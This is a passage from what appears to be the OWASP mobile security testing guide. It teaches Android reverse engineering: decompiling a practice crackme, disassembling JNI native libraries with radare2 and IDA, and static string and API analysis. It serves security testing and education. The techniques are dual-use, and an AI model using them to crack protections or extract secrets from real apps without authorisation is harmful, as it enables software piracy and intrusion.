something that's clunky, slow, and complicated to use,
\href{https://eclipse.org/ide/}{Eclipse} is the right IDE for you (based
on the author's personal bias).

If you don't mind looking at Smali instead of Java, you can use the
\href{https://github.com/JesusFreke/smali/wiki/smalidea}{smalidea plugin
for IntelliJ} for debugging. Smalidea supports single-stepping through
the bytecode and identifier renaming, and it watches for non-named
registers, which makes it much more powerful than a JD + IntelliJ setup.

\href{https://github.com/iBotPeaches/Apktool}{apktool} is a popular free
tool that can extract and disassemble resources directly from the APK
archive and disassemble Java bytecode to Smali format (Smali/Baksmali is
an assembler/disassembler for the Dex format. It's also Icelandic for
``Assembler/Disassembler''). apktool allows you to reassemble the
package, which is useful for patching and applying changes to the
Android Manifest.

You can accomplish more elaborate tasks (such as program analysis and
automated de-obfuscation) with open source reverse engineering
frameworks such as \href{https://www.radare.org}{Radare2},
\href{https://ghidra-sre.org/}{Ghidra} and
\href{https://angr.io/}{Angr}. You'll find usage examples for many of
these free tools and frameworks throughout the guide.

\hypertarget{commercial-tools}{%
\subparagraph{Commercial Tools}\label{commercial-tools}}

Building a reverse engineering environment for free is possible.
However, there are some commercial alternatives. The most commonly used
are:

\begin{itemize}
\item
  \href{https://www.pnfsoftware.com}{JEB}, a commercial decompiler,
  packs all the functionality necessary for static and dynamic analysis
  of Android apps into an all-in-one package. It is reasonably reliable
  and includes prompt support. It has a built-in debugger, which allows
  for an efficient workflow---setting breakpoints directly in the
  decompiled (and annotated) sources is invaluable, especially with
  ProGuard-obfuscated bytecode. Of course, convenience like this doesn't
  come cheap, and now that JEB is provided via a subscription-based
  license, you'll have to pay a monthly fee to use it.
\item
  \href{https://www.hex-rays.com/products/ida/}{IDA Pro} in its paid
  version is compatible with ARM, MIPS, Java bytecode, and, of course,
  Intel ELF binaries. It also comes with debuggers for both Java
  applications and native processes. With its powerful scripting,
  disassembling, and extension capabilities, IDA Pro usually works great
  for static analysis of native programs and libraries. However, the
  static analysis facilities it offers for Java code are rather basic:
  you get the Smali disassembly but not much more. You can't navigate
  the package and class structure, and some actions (such as renaming
  classes) can't be performed, which can make working with more complex
  Java apps tedious. In addition, unless you can afford the paid
  version, it won't be of help when reversing native code as the
  freeware version does not support the ARM processor type.
\end{itemize}

\hypertarget{disassembling-and-decompiling}{%
\paragraph{Disassembling and
Decompiling}\label{disassembling-and-decompiling}}

In Android app security testing, if the application is based solely on
Java and doesn't have any native code (C/C++ code), the reverse
engineering process is relatively easy and recovers (decompiles) almost
all the source code. In those cases, black-box testing (with access to
the compiled binary, but not the original source code) can get pretty
close to white-box testing.

Nevertheless, if the code has been purposefully obfuscated (or some
tool-breaking anti-decompilation tricks have been applied), the reverse
engineering process may be very time-consuming and unproductive. This
also applies to applications that contain native code. They can still be
reverse engineered, but the process is not automated and requires
knowledge of low-level details.

\hypertarget{decompiling-java-code}{%
\subparagraph{Decompiling Java Code}\label{decompiling-java-code}}

The process of decompilation consists of converting Java bytecode back
into Java source code. We'll be using UnCrackable App for Android Level
1 in the following examples, so download it if you haven't already.
First, let's install the app on a device or emulator and run it to see
what the crackme is about.

\begin{verbatim}
$ wget https://github.com/OWASP/owasp-mstg/raw/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk
$ adb install UnCrackable-Level1.apk
\end{verbatim}

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/b7218223963e160bb23b8740d81da1ec9ba40306.png}
\caption{Crackme}
\end{figure}

Seems like we're expected to find some kind of secret code!

We're looking for a secret string stored somewhere inside the app, so
the next step is to look inside. First, unzip the APK file and look at
the content.

\begin{verbatim}
$ unzip UnCrackable-Level1.apk -d UnCrackable-Level1
Archive:  UnCrackable-Level1.apk
  inflating: UnCrackable-Level1/AndroidManifest.xml
  inflating: UnCrackable-Level1/res/layout/activity_main.xml
  inflating: UnCrackable-Level1/res/menu/menu_main.xml
 extracting: UnCrackable-Level1/res/mipmap-hdpi-v4/ic_launcher.png
 extracting: UnCrackable-Level1/res/mipmap-mdpi-v4/ic_launcher.png
 extracting: UnCrackable-Level1/res/mipmap-xhdpi-v4/ic_launcher.png
 extracting: UnCrackable-Level1/res/mipmap-xxhdpi-v4/ic_launcher.png
 extracting: UnCrackable-Level1/res/mipmap-xxxhdpi-v4/ic_launcher.png
 extracting: UnCrackable-Level1/resources.arsc
  inflating: UnCrackable-Level1/classes.dex
  inflating: UnCrackable-Level1/META-INF/MANIFEST.MF
  inflating: UnCrackable-Level1/META-INF/CERT.SF
  inflating: UnCrackable-Level1/META-INF/CERT.RSA
\end{verbatim}

In the standard setup, all the Java bytecode and app data is in the file
\texttt{classes.dex} in the app root directory. This file conforms to
the Dalvik Executable Format (DEX), an Android-specific way of packaging
Java programs. Most Java decompilers take plain class files or JARs as
input, so you need to convert the classes.dex file into a JAR first. You
can do this with \texttt{dex2jar} or \texttt{enjarify}.

Once you have a JAR file, you can use any free decompiler to produce
Java code. In this example, we'll use the
\href{https://www.benf.org/other/cfr/}{CFR decompiler}. CFR is under
active development, and brand-new releases are available on the author's
website. CFR was released under an MIT license, so you can use it freely
even though its source code is not available.

The easiest way to run CFR is through \texttt{apkx}, which also packages
\texttt{dex2jar} and automates extraction, conversion, and
decompilation. Install it:

\begin{verbatim}
$ git clone https://github.com/b-mueller/apkx
$ cd apkx
$ sudo ./install.sh
\end{verbatim}

This should copy \texttt{apkx} to \texttt{/usr/local/bin}. Run it on
\texttt{UnCrackable-Level1.apk}:

\begin{verbatim}
$ apkx UnCrackable-Level1.apk
Extracting UnCrackable-Level1.apk to UnCrackable-Level1
Converting: classes.dex -> classes.jar (dex2jar)
dex2jar UnCrackable-Level1/classes.dex -> UnCrackable-Level1/classes.jar
Decompiling to UnCrackable-Level1/src (cfr)
\end{verbatim}

You should now find the decompiled sources in the directory
\texttt{Uncrackable-Level1/src}. To view the sources, a simple text
editor (preferably with syntax highlighting) is fine, but loading the
code into a Java IDE makes navigation easier. Let's import the code into
IntelliJ, which also provides on-device debugging functionality.

Open IntelliJ and select ``Android'' as the project type in the left tab
of the ``New Project'' dialog. Enter ``Uncrackable1'' as the application
name and ``vantagepoint.sg'' as the company name. This results in the
package name ``sg.vantagepoint.uncrackable1'', which matches the
original package name. Using a matching package name is important if you
want to attach the debugger to the running app later on because Intellij
uses the package name to identify the correct process.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/6dcc613ab62a7f54560f516bce94dc562a5ec576.jpg}
\caption{Images/Chapters/0x05c/intellij\_new\_project.jpg}
\end{figure}

In the next dialog, pick any API number; you don't actually want to
compile the project, so the number doesn't matter. Click ``next'' and
choose ``Add no Activity'', then click ``finish''.

Once you have created the project, expand the ``1: Project'' view on the
left and navigate to the folder \texttt{app/src/main/java}. Right-click
and delete the default package ``sg.vantagepoint.uncrackable1'' created
by IntelliJ.

\begin{figure}
\centering
\includegraphics[width=3.64583in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/576f6aa1d427f2ec67695539e120520535f6d392.jpg}
\caption{Delete default package}
\end{figure}

Now, open the \texttt{Uncrackable-Level1/src} directory in a file
browser and drag the \texttt{sg} directory into the now empty
\texttt{Java} folder in the IntelliJ project view (hold the ``alt'' key
to copy the folder instead of moving it).

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/8ff26bdbf1d75df81f76e8179d0c8eaa03841b67.jpg}
\caption{Images/Chapters/0x05c/drag\_code.jpg}
\end{figure}

You'll end up with a structure that resembles the original Android
Studio project from which the app was built.

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/479365e620ef5d468ce30bee9120b9223109e90f.jpg}
\caption{Final Structure}
\end{figure}

See the section
``\protect\hyperlink{reviewing-decompiled-java-code}{Reviewing
Decompiled Java Code}'' below to learn on how to proceed when inspecting
the decompiled Java code.

\hypertarget{disassembling-native-code}{%
\subparagraph{Disassembling Native
Code}\label{disassembling-native-code}}

Dalvik and ART both support the Java Native Interface (JNI), which
defines a way for Java code to interact with native code written in
C/C++. As on other Linux-based operating systems, native code is
packaged (compiled) into ELF dynamic libraries (*.so), which the Android
app loads at runtime via the \texttt{System.load} method. However,
instead of relying on widely used C libraries (such as glibc), Android
binaries are built against a custom libc named
\href{https://github.com/android/platform_bionic}{Bionic}. Bionic adds
support for important Android-specific services such as system
properties and logging, and it is not fully POSIX-compatible.

When reversing an Android application containing native code, we need to
understand a couple of data structures related to the JNI bridge between
Java and native code. From the reversing perspective, we need to be
aware of two key data structures: \texttt{JavaVM} and \texttt{JNIEnv}.
Both of them are pointers to pointers to function tables:

\begin{itemize}
\tightlist
\item
  \texttt{JavaVM} provides an interface to invoke functions for creating
  and destroying a JavaVM. Android allows only one \texttt{JavaVM} per
  process and is not really relevant for our reversing purposes.
\item
  \texttt{JNIEnv} provides access to most of the JNI functions which are
  accessible at a fixed offset through the \texttt{JNIEnv} pointer. This
  \texttt{JNIEnv} pointer is the first parameter passed to every JNI
  function. We will discuss this concept again with the help of an
  example later in this chapter.
\end{itemize}

It is worth highlighting that analyzing disassembled native code is much
more challenging than disassembled Java code. When reversing the native
code in an Android application we will need a disassembler.

In the next example we'll reverse the HelloWorld-JNI.apk from the OWASP
MSTG repository. Installing and running it in an emulator or Android
device is optional.

\begin{verbatim}
$ wget https://github.com/OWASP/owasp-mstg/raw/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk
\end{verbatim}

\begin{quote}
This app is not exactly spectacular---all it does is show a label with
the text ``Hello from C++''. This is the app Android generates by
default when you create a new project with C/C++ support--- it's just
enough to show the basic principles of JNI calls.
\end{quote}

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/8e08bca1d4ad633b71205ea22c4c17cafa6cd2bb.png}
\caption{Hello World}
\end{figure}

Decompile the APK with \texttt{apkx}.

\begin{verbatim}
$ apkx HelloWord-JNI.apk
Extracting HelloWord-JNI.apk to HelloWord-JNI
Converting: classes.dex -> classes.jar (dex2jar)
dex2jar HelloWord-JNI/classes.dex -> HelloWord-JNI/classes.jar
Decompiling to HelloWord-JNI/src (cfr)
\end{verbatim}

This extracts the source code into the \texttt{HelloWord-JNI/src}
directory. The main activity is found in the file
\texttt{HelloWord-JNI/src/sg/vantagepoint/helloworldjni/MainActivity.java}.
The ``Hello World'' text view is populated in the \texttt{onCreate}
method:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MainActivity}
\KeywordTok{extends}\NormalTok{ AppCompatActivity \{}
    \DataTypeTok{static}\NormalTok{ \{}
        \BuiltInTok{System}\NormalTok{.}\FunctionTok{loadLibrary}\NormalTok{(}\StringTok{"native{-}lib"}\NormalTok{);}
\NormalTok{    \}}

    \AttributeTok{@Override}
    \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onCreate}\NormalTok{(Bundle bundle) \{}
        \KeywordTok{super}\NormalTok{.}\FunctionTok{onCreate}\NormalTok{(bundle);}
        \KeywordTok{this}\NormalTok{.}\FunctionTok{setContentView}\NormalTok{(}\DecValTok{2130968603}\NormalTok{);}
\NormalTok{        ((TextView)}\KeywordTok{this}\NormalTok{.}\FunctionTok{findViewById}\NormalTok{(}\DecValTok{2131427422}\NormalTok{)).}\FunctionTok{setText}\NormalTok{((}\BuiltInTok{CharSequence}\NormalTok{)}\KeywordTok{this}\NormalTok{.}\FunctionTok{stringFromJNI}\NormalTok{());}
\NormalTok{    \}}

    \KeywordTok{public} \KeywordTok{native} \BuiltInTok{String} \FunctionTok{stringFromJNI}\NormalTok{();}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Note the declaration of \texttt{public\ native\ String\ stringFromJNI}
at the bottom. The keyword ``native'' tells the Java compiler that this
method is implemented in a native language. The corresponding function
is resolved during runtime, but only if a native library that exports a
global symbol with the expected signature is loaded (signatures comprise
a package name, class name, and method name). In this example, this
requirement is satisfied by the following C or C++ function:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{JNIEXPORT jstring JNICALL Java\_sg\_vantagepoint\_helloworld\_MainActivity\_stringFromJNI(JNIEnv *env, jobject)}
\end{Highlighting}
\end{Shaded}

So where is the native implementation of this function? If you look into
the ``lib'' directory of the unzipped APK archive, you'll see several
subdirectories (one per supported processor architecture), each of them
containing a version of the native library, in this case
\texttt{libnative-lib.so}. When \texttt{System.loadLibrary} is called,
the loader selects the correct version based on the device that the app
is running on. Before moving ahead, pay attention to the first parameter
passed to the current JNI function. It is the same \texttt{JNIEnv} data
structure which was discussed earlier in this section.

\begin{figure}
\centering
\includegraphics[width=2.08333in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/9fc57a40d76503de64f69b4bd6de61b4ccf8932f.jpg}
\caption{Architectures}
\end{figure}

Following the naming convention mentioned above, you can expect the
library to export a symbol called
\texttt{Java\_sg\_vantagepoint\_helloworld\_MainActivity\_stringFromJNI}.
On Linux systems, you can retrieve the list of symbols with
\texttt{readelf} (included in GNU binutils) or \texttt{nm}. Do this on
Mac OS with the \texttt{greadelf} tool, which you can install via
Macports or Homebrew. The following example uses \texttt{greadelf}:

\begin{verbatim}
$ greadelf -W -s libnative-lib.so | grep Java
     3: 00004e49   112 FUNC    GLOBAL DEFAULT   11 Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI
\end{verbatim}

You can also see this using radare2's rabin2:

\begin{verbatim}
$ rabin2 -s HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so | grep -i Java
003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI
\end{verbatim}

This is the native function that eventually gets executed when the
\texttt{stringFromJNI} native method is called.

To disassemble the code, you can load \texttt{libnative-lib.so} into any
disassembler that understands ELF binaries (i.e., any disassembler). If
the app ships with binaries for different architectures, you can
theoretically pick the architecture you're most familiar with, as long
as it is compatible with the disassembler. Each version is compiled from
the same source and implements the same functionality. However, if
you're planning to debug the library on a live device later, it's
usually wise to pick an ARM build.

To support both older and newer ARM processors, Android apps ship with
multiple ARM builds compiled for different Application Binary Interface
(ABI) versions. The ABI defines how the application's machine code is
supposed to interact with the system at runtime. The following ABIs are
supported:

\begin{itemize}
\tightlist
\item
  armeabi: ABI is for ARM-based CPUs that support at least the ARMv5TE
  instruction set.
\item
  armeabi-v7a: This ABI extends armeabi to include several CPU
  instruction set extensions.
\item
  arm64-v8a: ABI for ARMv8-based CPUs that support AArch64, the new
  64-bit ARM architecture.
\end{itemize}

Most disassemblers can handle any of those architectures. Below, we'll
be viewing the armeabi-v7a version (located in
\texttt{HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so}) in radare2 and
in IDA Pro. See the section
``\protect\hyperlink{reviewing-disassembled-native-code}{Reviewing
Disassembled Native Code}'' below to learn on how to proceed when
inspecting the disassembled native code.

radare2

To open the file in radare2 you only have to run
\texttt{r2\ -A\ HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so}. The
chapter ``\href{0x05b-Basic-Security_Testing.md}{Android Basic Security
Testing}'' already introduced radare2. Remember that you can use the
flag \texttt{-A} to run the \texttt{aaa} command right after loading the
binary in order to analyze all referenced code.

\begin{verbatim}
$ r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so

[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Finding xrefs in noncode section with anal.in=io.maps
[x] Analyze value pointers (aav)
[x] Value from 0x00000000 to 0x00001dcf (aav)
[x] 0x00000000-0x00001dcf in 0x0-0x1dcf (aav)
[x] Emulate code to find computed references (aae)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- Print the contents of the current block with the 'p' command
[0x00000e3c]>
\end{verbatim}

Note that for bigger binaries, starting directly with the flag
\texttt{-A} might be very time consuming as well as unnecessary.
Depending on your purpose, you may open the binary without this option
and then apply a less complex analysis like \texttt{aa} or a more
concrete type of analysis such as the ones offered in \texttt{aa} (basic
analysis of all functions) or \texttt{aac} (analyze function calls).
Remember to always type \texttt{?} to get the help or attach it to
commands to see even more command or options. For example, if you enter
\texttt{aa?} you'll get the full list of analysis commands.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{0x00001760}\NormalTok{]}\OperatorTok{>}\NormalTok{ aa?}
\ExtensionTok{Usage}\NormalTok{: aa[0*?]   }\CommentTok{\# see also \textquotesingle{}af\textquotesingle{} and \textquotesingle{}afna\textquotesingle{}}
\KeywordTok{|} \ExtensionTok{aa}\NormalTok{                  alias for }\StringTok{\textquotesingle{}af@@ sym.*;af@entry0;afva\textquotesingle{}}
\KeywordTok{|} \ExtensionTok{aaa}\NormalTok{[?]              autoname functions after aa (see afna)}
\KeywordTok{|} \ExtensionTok{aab}\NormalTok{                 abb across bin.sections.rx}
\KeywordTok{|} \ExtensionTok{aac}\NormalTok{ [len]           analyze function calls (af @@ }\KeywordTok{\textasciigrave{}}\ExtensionTok{pi}\NormalTok{ len\textasciitilde{}call[1]}\KeywordTok{\textasciigrave{}}\NormalTok{)}
\KeywordTok{|} \ExtensionTok{aac*}\NormalTok{ [len]          flag function calls without performing a complete analysis}
\KeywordTok{|} \ExtensionTok{aad}\NormalTok{ [len]           analyze data references to code}
\KeywordTok{|} \ExtensionTok{aae}\NormalTok{ [len] ([addr])  }\ExtensionTok{analyze}\NormalTok{ references with ESIL (optionally to address)}
\KeywordTok{|} \ExtensionTok{aaf}\NormalTok{[e}\KeywordTok{|}\ExtensionTok{t}\NormalTok{]            analyze all functions (e anal.hasnext=1}\KeywordTok{;}\ExtensionTok{afr}\NormalTok{ @@c:isq) }\KeywordTok{(}\VariableTok{aafe=}\NormalTok{aef}\ExtensionTok{@@f}\KeywordTok{)}
\KeywordTok{|} \ExtensionTok{aaF}\NormalTok{ [sym*]          set anal.in=block for all the spaces between flags matching glob}
\KeywordTok{|} \ExtensionTok{aaFa}\NormalTok{ [sym*]         same as aaF but uses af/a2f instead of af+/afb+ (slower but more accurate)}
\KeywordTok{|} \ExtensionTok{aai}\NormalTok{[j]              show info of all analysis parameters}
\KeywordTok{|} \ExtensionTok{aan}\NormalTok{                 autoname functions that either start with fcn.* or sym.func.*}
\KeywordTok{|} \ExtensionTok{aang}\NormalTok{                find function and symbol names from golang binaries}
\KeywordTok{|} \ExtensionTok{aao}\NormalTok{                 analyze all objc references}
\KeywordTok{|} \ExtensionTok{aap}\NormalTok{                 find and analyze function preludes}
\KeywordTok{|} \ExtensionTok{aar}\NormalTok{[?] [len]        analyze len bytes of instructions for references}
\KeywordTok{|} \ExtensionTok{aas}\NormalTok{ [len]           analyze symbols (af @@= }\KeywordTok{\textasciigrave{}}\ExtensionTok{isq}\NormalTok{\textasciitilde{}[0]}\KeywordTok{\textasciigrave{}}\NormalTok{)}
\KeywordTok{|} \ExtensionTok{aaS}\NormalTok{                 analyze all flags starting with sym. (af @@ sym.*)}
\KeywordTok{|} \ExtensionTok{aat}\NormalTok{ [len]           analyze all consecutive functions in section}
\KeywordTok{|} \ExtensionTok{aaT}\NormalTok{ [len]           analyze code after trap{-}sleds}
\KeywordTok{|} \ExtensionTok{aau}\NormalTok{ [len]           list mem areas (larger than len bytes) }\ExtensionTok{not}\NormalTok{ covered by functions}
\KeywordTok{|} \ExtensionTok{aav}\NormalTok{ [sat]           find values referencing a specific section or map}
\end{Highlighting}
\end{Shaded}

There is a thing that is worth noticing about radare2 vs other
disassemblers like e.g.~IDA Pro. The following quote from an
\href{http://radare.today/posts/analysis-by-default/}{article} of
radare2's blog (\url{http://radare.today/}) pretty summarizes this.

\begin{quote}
Code analysis is not a quick operation, and not even predictable or
taking a linear time to be processed. This makes starting times pretty
heavy, compared to just loading the headers and strings information like
it's done by default.

People that are used to IDA or Hopper just load the binary, go out to
make a coffee and then when the analysis is done, they start doing the
manual analysis to understand what the program is doing. It's true that
those tools perform the analysis in background, and the GUI is not
blocked. But this takes a lot of CPU time, and r2 aims to run in many
more platforms than just high-end desktop computers.
\end{quote}

This said, please see section
``\protect\hyperlink{reviewing-disassembled-native-code}{Reviewing
Disassembled Native Code}'' to learn more bout how radare2 can help us
performing our reversing tasks much faster. For example, getting the
disassembly of an specific function is a trivial task that can be
performed in one command.

IDA Pro

If you own an IDA Pro license, open the file and once in the ``Load new
file'' dialog, choose ``ELF for ARM (Shared Object)'' as the file type
(IDA should detect this automatically), and ``ARM Little-Endian'' as the
processor type.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/8f8c639e93e6960d7f50c243f52229fc18cdcde3.jpg}
\caption{Images/Chapters/0x05c/IDA\_open\_file.jpg}
\end{figure}

\begin{quote}
The freeware version of IDA Pro unfortunately does not support the ARM
processor type.
\end{quote}

\hypertarget{static-analysis-10}{%
\subsubsection{Static Analysis}\label{static-analysis-10}}

For white-box source code testing, you'll need a setup similar to the
developer's setup, including a test environment that includes the
Android SDK and an IDE. Access to either a physical device or an
emulator (for debugging the app) is recommended.

During \textbf{black-box testing}, you won't have access to the original
form of the source code. You'll usually have the application package in
\href{https://en.wikipedia.org/wiki/Android_application_package}{Android's
APK format}, which can be installed on an Android device or reverse
engineered as explained in the section ``Disassembling and
Decompiling''.

\hypertarget{basic-information-gathering}{%
\paragraph{Basic Information
Gathering}\label{basic-information-gathering}}

As discussed in previous sections, an Android application can consist of
both Java/Kotlin bytecode and native code. In this section, we will
learn about some approaches and tools for collecting basic information
using static analysis.

\hypertarget{retrieving-strings}{%
\subparagraph{Retrieving Strings}\label{retrieving-strings}}

While performing any kind of binary analysis, strings can be considered
as one of the most valuable starting points as they provide context. For
example, an error log string like ``Data encryption failed.'' gives us a
hint that the adjoining code might be responsible for performing some
kind of encryption operation.

Java and Kotlin Bytecode

As we already know, all the Java and Kotlin bytecode of an Android
application is compiled into a DEX file. Each DEX file contains a
\href{https://source.android.com/devices/tech/dalvik/dex-format\#file-layout}{list
of string identifiers} (strings\_ids), which contains all the string
identifiers used in the binary whenever a string is referred, including
internal naming (e.g, type descriptors) or constant objects referred by
the code (e.g hardcoded strings). You can simply dump this list using
tools such as Ghidra (GUI based) or
\href{http://newandroidbook.com/tools/dextra.html}{Dextra} (CLI based).

With Ghidra, strings can be obtained by simply loading the DEX file and
selecting \textbf{Window -\textgreater{} Defined strings} in the menu.

\begin{quote}
Loading an APK file directly into Ghidra might lead to inconsistencies.
Thus it is recommended to extract the DEX file by unzipping the APK file
and then loading it into Ghidra.
\end{quote}

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/8de449706bf63265be48bd835aa227612a1e921f.png}
\caption{Images/Chapters/0x05c/ghidra\_dex\_strings.png}
\end{figure}

With Dextra, you can dump all the strings using the following command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{dextra}\NormalTok{ {-}S classes.dex}
\end{Highlighting}
\end{Shaded}

The output from Dextra can be manipulated using standard Linux commands,
for example, using \texttt{grep} to search for certain keywords.

It is important to know, the list of strings obtained using the above
tools can be very big, as it also includes the various class and package
names used in the application. Going through the complete list,
specially for big binaries, can be very cumbersome. Thus, it is
recommended to start with keyword-based searching and go through the
list only when keyword search does not help. Some generic keywords which
can be a good starting point are - password, key, and secret. Other
useful keywords specific to the context of the app can be obtained while
you are using the app itself. For instance, imagine that the app has as
login form, you can take note of the displayed placeholder or title text
of the input fields and use that as an entry point for your static
analysis.

Native Code

In order to extract strings from native code used in an Android
application, you can use GUI tools such as Ghidra or Cutter or rely on
CLI-based tools such as the \emph{strings} Unix utility
(\texttt{strings\ \textless{}path\_to\_binary\textgreater{}}) or
radare2's rabin2
(\texttt{rabin2\ -zz\ \textless{}path\_to\_binary\textgreater{}}). When
using the CLI-based ones you can take advantage of other tools such as
grep (e.g.~in conjunction with regular expressions) to further filter
and analyze the results.

\hypertarget{cross-references}{%
\subparagraph{Cross References}\label{cross-references}}

Java and Kotlin

There are many RE tools that support retrieving Java cross references.
For many of the GUI-based ones, this is usually done by right clicking
on the desired function and selecting the corresponding option,
e.g.~\textbf{Show References to} in Ghidra or
\href{https://github.com/skylot/jadx/wiki/jadx-gui-features-overview\#find-usage}{\textbf{Find
Usage} in jadx}.

Native Code

Similarly to Java analysis, you can also use Ghidra to analyze native
libraries and obtain cross references by right clicking the desired
function and selecting \textbf{Show References to}.

\hypertarget{api-usage}{%
\subparagraph{API Usage}\label{api-usage}}

The Android platform provides many in-built libraries for frequently
used functionalities in applications, for example cryptography,
Bluetooth, NFC, network or location libraries. Determining the presence
of these libraries in an application can give us valuable information
about its nature.

For instance, if an application is importing
\texttt{javax.crypto.Cipher}, it indicates that the application will be
performing some kind of cryptographic operation. Fortunately,
cryptographic calls are very standard in nature, i.e, they need to be
called in a particular order to work correctly, this knowledge can be
helpful when analyzing cryptography APIs. For example, by looking for
the \texttt{Cipher.getInstance} function, we can determine the
cryptographic algorithm being used. With such an approach we can
directly move to analyzing cryptographic assets, which often are very
critical in an application. Further information on how to analyze
Android's cryptographic APIs is discussed in the section
``\href{0x05e-Testing-Cryptography.md}{Android Cryptographic APIs}''.

Similarly, the above approach can be used to determine where and how an
application is using NFC. For instance, an application using Host-based
Card Emulation for performing digital payments must use the
\texttt{android.nfc} package. Therefore, a good stating point for NFC
API analysis would be to consult the
\href{https://developer.android.com/guide/topics/connectivity/nfc/hce}{Android
Developer Documentation} to get some ideas and start searching for
critical functions such as \texttt{processCommandApdu} from the
\texttt{android.nfc.cardemulation.HostApduService} class.

\hypertarget{network-communication}{%
\subparagraph{Network Communication}\label{network-communication}}

Most of the apps you might encounter connect to remote endpoints. Even
before you perform any dynamic analysis (e.g.~traffic capture and
analysis), you can obtain some initial inputs or entry points by
enumerating the domains to which the application is supposed to
communicate to.

Typically these domains will be present as strings within the binary of
the application. One way to achieve this is by using automated tools
such as \href{https://github.com/shivsahni/APKEnum}{APKEnum} or
\href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}.
Alternatively, you can \emph{grep} for the domain names by using regular
expressions. For this you can target the app binary directly or reverse
engineer it and target the disassembled or decompiled code. The latter
option has a clear advantage: it can provide you with \textbf{context},
as you'll be able to see in which context each domain is being used
(e.g.~class and method). ``

From here on you can use this information to derive more insights which
might be of use later during your analysis, e.g.~you could match the
domains to the pinned certificates or the network security configuration
file or perform further reconnaissance on domain names to know more
about the target environment. When evaluating an application it is
important to check the network security configuration file, as often
(less secure) debug configurations might be pushed into final release
builds by mistake.

The implementation and verification of secure connections can be an
intricate process and there are numerous aspects to consider. For
instance, many applications use other protocols apart from HTTP such as
XMPP or plain TCP packets, or perform certificate pinning in an attempt
to deter MITM attacks but unfortunately having severe logical bugs in
its implementation or an inherently wrong security network
configuration.

Remember that in most of the cases, just using static analysis will not
be enough and might even turn to be extremely inefficient when compared
to the dynamic alternatives which will get much more reliable results
(e.g.~using an interceptor proxy). In this section we've just slightly
touched the surface, please refer to the section
``\href{0x05b-Basic-Security_Testing.md\#basic-network-monitoringsniffing}{Basic
Network Monitoring/Sniffing}'' in the ``Android Basic Security Testing''
chapter and also check the test cases in the chapter
``\href{0x05g-Testing-Network-Communication.md}{Android Network APIs}''.

\hypertarget{manual-reversed-code-review}{%
\paragraph{Manual (Reversed) Code
Review}\label{manual-reversed-code-review}}

\hypertarget{reviewing-decompiled-java-code}{%
\subparagraph{Reviewing Decompiled Java
Code}\label{reviewing-decompiled-java-code}}

Following the example from ``Decompiling Java Code'', we assume that
you've successfully decompiled and opened the crackme app in IntelliJ.
As soon as IntelliJ has indexed the code, you can browse it just like
you'd browse any other Java project. Note that many of the decompiled
packages, classes, and methods have weird one-letter names; this is
because the bytecode has been ``minified'' with ProGuard at build time.
This is a basic type of obfuscation that makes the bytecode a little
more difficult to read, but with a fairly simple app like this one, it
won't cause you much of a headache. When you're analyzing a more complex
app, however, it can get quite annoying.

When analyzing obfuscated code, annotating class names, method names,
and other identifiers as you go along is a good practice. Open the
\texttt{MainActivity} class in the package
\texttt{sg.vantagepoint.uncrackable1}. The method \texttt{verify} is
called when you tap the ``verify'' button. This method passes the user
input to a static method called \texttt{a.a}, which returns a boolean
value. It seems plausible that \texttt{a.a} verifies user input, so
we'll refactor the code to reflect this.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/89f4493dc543c8aac3d5832072600f0f501870e7.jpg}
\caption{Images/Chapters/0x05c/check\_input.jpg}
\end{figure}

Right-click the class name (the first \texttt{a} in \texttt{a.a}) and
select Refactor -\textgreater{} Rename from the drop-down menu (or press
Shift-F6). Change the class name to something that makes more sense
given what you know about the class so far. For example, you could call
it ``Validator'' (you can always revise the name later). \texttt{a.a}
now becomes \texttt{Validator.a}. Follow the same procedure to rename
the static method \texttt{a} to \texttt{check\_input}.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/ceae72251f9dfa7c124c9f3ddaaf620a54091696.jpg}
\caption{Images/Chapters/0x05c/refactored.jpg}
\end{figure}

Congratulations, you just learned the fundamentals of static analysis!
It is all about theorizing, annotating, and gradually revising theories
about the analyzed program until you understand it completely or, at
least, well enough for whatever you want to achieve.

Next, Ctrl+click (or Command+click on Mac) on the \texttt{check\_input}
method. This takes you to the method definition. The decompiled method
looks like this:

\begin{Shaded}
\begin{Highlighting}[]
